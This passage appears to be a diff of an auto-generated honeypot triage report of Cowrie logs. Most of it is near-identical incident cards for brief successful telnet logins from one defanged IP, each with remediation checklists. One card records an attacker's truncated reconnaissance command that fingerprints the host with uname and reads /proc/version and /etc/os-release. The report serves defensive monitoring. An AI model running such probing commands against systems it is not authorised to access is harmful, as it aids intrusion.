-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:38` | `cowrie.session.connect` |
-| `2026-08-22 14:07:38` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:39` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:39` | `cowrie.login.success` |
-| `2026-08-22 14:07:40` | `cowrie.session.params` |
-| `2026-08-22 14:07:40` | `cowrie.log.closed` |
-| `2026-08-22 14:07:40` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-62d924a13e03
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:40` | `cowrie.session.connect` |
-| `2026-08-22 14:07:40` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:41` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:41` | `cowrie.login.success` |
-| `2026-08-22 14:07:41` | `cowrie.session.params` |
-| `2026-08-22 14:07:41` | `cowrie.log.closed` |
-| `2026-08-22 14:07:41` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8a2651417b19
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:41` | `cowrie.session.connect` |
-| `2026-08-22 14:07:42` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:43` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:43` | `cowrie.login.success` |
-| `2026-08-22 14:07:43` | `cowrie.session.params` |
-| `2026-08-22 14:07:43` | `cowrie.log.closed` |
-| `2026-08-22 14:07:43` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-06a5b2f53c95
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:43` | `cowrie.session.connect` |
-| `2026-08-22 14:07:44` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:45` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:45` | `cowrie.login.success` |
-| `2026-08-22 14:07:45` | `cowrie.session.params` |
-| `2026-08-22 14:07:45` | `cowrie.log.closed` |
-| `2026-08-22 14:07:45` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-42eb6239f539
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:45` | `cowrie.session.connect` |
-| `2026-08-22 14:07:46` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:46` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:46` | `cowrie.login.success` |
-| `2026-08-22 14:07:47` | `cowrie.session.params` |
-| `2026-08-22 14:07:47` | `cowrie.log.closed` |
-| `2026-08-22 14:07:47` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-eda4d6c0891f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:47` | `cowrie.session.connect` |
-| `2026-08-22 14:07:48` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:48` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:48` | `cowrie.login.success` |
-| `2026-08-22 14:07:49` | `cowrie.session.params` |
-| `2026-08-22 14:07:49` | `cowrie.log.closed` |
-| `2026-08-22 14:07:49` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8e024c56715e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:49` | `cowrie.session.connect` |
-| `2026-08-22 14:07:50` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:50` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:50` | `cowrie.login.success` |
-| `2026-08-22 14:07:51` | `cowrie.session.params` |
-| `2026-08-22 14:07:51` | `cowrie.log.closed` |
-| `2026-08-22 14:07:51` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-51edfd7b0680
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:51` | `cowrie.session.connect` |
-| `2026-08-22 14:07:52` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:52` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:52` | `cowrie.login.success` |
-| `2026-08-22 14:07:53` | `cowrie.session.params` |
-| `2026-08-22 14:07:53` | `cowrie.log.closed` |
-| `2026-08-22 14:07:53` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-555ace019b93
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:53` | `cowrie.session.connect` |
-| `2026-08-22 14:07:53` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:54` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:54` | `cowrie.login.success` |
-| `2026-08-22 14:07:55` | `cowrie.session.params` |
-| `2026-08-22 14:07:55` | `cowrie.log.closed` |
-| `2026-08-22 14:07:55` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-e05664c02a9c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:55` | `cowrie.session.connect` |
-| `2026-08-22 14:07:55` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:56` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:56` | `cowrie.login.success` |
-| `2026-08-22 14:07:56` | `cowrie.session.params` |
-| `2026-08-22 14:07:56` | `cowrie.log.closed` |
-| `2026-08-22 14:07:57` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-b7b8b51f454f
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:07 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:57` | `cowrie.session.connect` |
-| `2026-08-22 14:07:57` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:58` | `cowrie.telnet.option` |
-| `2026-08-22 14:07:58` | `cowrie.login.success` |
-| `2026-08-22 14:07:58` | `cowrie.session.params` |
-| `2026-08-22 14:07:58` | `cowrie.log.closed` |
-| `2026-08-22 14:07:58` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3778c9d824bb
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:07 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:07:58` | `cowrie.session.connect` |
-| `2026-08-22 14:07:59` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:00` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:00` | `cowrie.login.success` |
-| `2026-08-22 14:08:00` | `cowrie.session.params` |
-| `2026-08-22 14:08:00` | `cowrie.log.closed` |
-| `2026-08-22 14:08:00` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-15b6a6f2f229
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:02` | `cowrie.session.connect` |
-| `2026-08-22 14:08:03` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:03` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:03` | `cowrie.login.success` |
-| `2026-08-22 14:08:04` | `cowrie.session.params` |
-| `2026-08-22 14:08:04` | `cowrie.log.closed` |
-| `2026-08-22 14:08:04` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-0fc498430cae
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:04` | `cowrie.session.connect` |
-| `2026-08-22 14:08:05` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:05` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:05` | `cowrie.login.success` |
-| `2026-08-22 14:08:06` | `cowrie.session.params` |
-| `2026-08-22 14:08:06` | `cowrie.log.closed` |
-| `2026-08-22 14:08:06` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-4338b274cae4
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 2s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:06` | `cowrie.session.connect` |
-| `2026-08-22 14:08:07` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:07` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:07` | `cowrie.login.success` |
-| `2026-08-22 14:08:08` | `cowrie.session.params` |
-| `2026-08-22 14:08:08` | `cowrie.log.closed` |
-| `2026-08-22 14:08:08` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d18c6d411ab9
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:10` | `cowrie.session.connect` |
-| `2026-08-22 14:08:11` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:11` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:11` | `cowrie.login.success` |
-| `2026-08-22 14:08:12` | `cowrie.session.params` |
-| `2026-08-22 14:08:12` | `cowrie.log.closed` |
-| `2026-08-22 14:08:12` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8567c796042d
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 5s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:12` | `cowrie.session.connect` |
-| `2026-08-22 14:08:12` | `cowrie.client.version` |
-| `2026-08-22 14:08:12` | `cowrie.client.kex` |
-| `2026-08-22 14:08:14` | `cowrie.login.success` |
-| `2026-08-22 14:08:16` | `cowrie.session.params` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.success` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:16` | `cowrie.command.input` |
-| `2026-08-22 14:08:17` | `cowrie.log.closed` |
-| `2026-08-22 14:08:17` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-15c0b1be8047
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:12` | `cowrie.session.connect` |
-| `2026-08-22 14:08:13` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:13` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:13` | `cowrie.login.success` |
-| `2026-08-22 14:08:14` | `cowrie.session.params` |
-| `2026-08-22 14:08:14` | `cowrie.log.closed` |
-| `2026-08-22 14:08:14` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-5525f791e696
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:14` | `cowrie.session.connect` |
-| `2026-08-22 14:08:15` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:15` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:15` | `cowrie.login.success` |
-| `2026-08-22 14:08:16` | `cowrie.session.params` |
-| `2026-08-22 14:08:16` | `cowrie.log.closed` |
-| `2026-08-22 14:08:16` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-3533e4efe356
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:16` | `cowrie.session.connect` |
-| `2026-08-22 14:08:17` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:18` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:18` | `cowrie.login.success` |
-| `2026-08-22 14:08:18` | `cowrie.session.params` |
-| `2026-08-22 14:08:18` | `cowrie.log.closed` |
-| `2026-08-22 14:08:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-9075f2b34b53
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:18` | `cowrie.session.connect` |
-| `2026-08-22 14:08:19` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:20` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:20` | `cowrie.login.success` |
-| `2026-08-22 14:08:20` | `cowrie.session.params` |
-| `2026-08-22 14:08:20` | `cowrie.log.closed` |
-| `2026-08-22 14:08:20` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-154bff5112b3
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:20` | `cowrie.session.connect` |
-| `2026-08-22 14:08:21` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:22` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:22` | `cowrie.login.success` |
-| `2026-08-22 14:08:22` | `cowrie.session.params` |
-| `2026-08-22 14:08:22` | `cowrie.log.closed` |
-| `2026-08-22 14:08:22` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-61bb74832329
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:22` | `cowrie.session.connect` |
-| `2026-08-22 14:08:23` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:23` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:23` | `cowrie.login.success` |
-| `2026-08-22 14:08:24` | `cowrie.session.params` |
-| `2026-08-22 14:08:24` | `cowrie.log.closed` |
-| `2026-08-22 14:08:24` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-0c8732e64a7d
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:24` | `cowrie.session.connect` |
-| `2026-08-22 14:08:25` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:25` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:25` | `cowrie.login.success` |
-| `2026-08-22 14:08:26` | `cowrie.session.params` |
-| `2026-08-22 14:08:26` | `cowrie.log.closed` |
-| `2026-08-22 14:08:26` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-bc7d4573f05a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:26` | `cowrie.session.connect` |
-| `2026-08-22 14:08:27` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:27` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:27` | `cowrie.login.success` |
-| `2026-08-22 14:08:28` | `cowrie.session.params` |
-| `2026-08-22 14:08:28` | `cowrie.log.closed` |
-| `2026-08-22 14:08:28` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-d586a1739871
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 14:08:28` | `cowrie.session.connect` |
-| `2026-08-22 14:08:29` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:29` | `cowrie.telnet.option` |
-| `2026-08-22 14:08:29` | `cowrie.login.success` |
-| `2026-08-22 14:08:30` | `cowrie.session.params` |
-| `2026-08-22 14:08:30` | `cowrie.log.closed` |
-| `2026-08-22 14:08:30` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
-- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-876b10ef2e2e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `77.239.124[.]117` |
-| **First Seen** | 2026-08-22 14:08 |
-| **Last Seen** | 2026-08-22 14:08 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 |
